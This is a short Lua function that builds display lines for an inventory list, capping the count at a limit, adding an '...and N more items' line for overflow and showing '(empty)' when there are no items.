local function buildInventoryLines(invItems, limit)
    local lines = {}
    local displayCount = math.min(limit, #invItems)
    for i = 1, displayCount do
        table.insert(lines, formatItemLine(invItems[i]))
    end
    if #invItems > limit then
        table.insert(lines, string.format("...and %d more items", #invItems - limit))
    end
    if #lines == 0 then table.insert(lines, "(empty)") end
    return lines
end

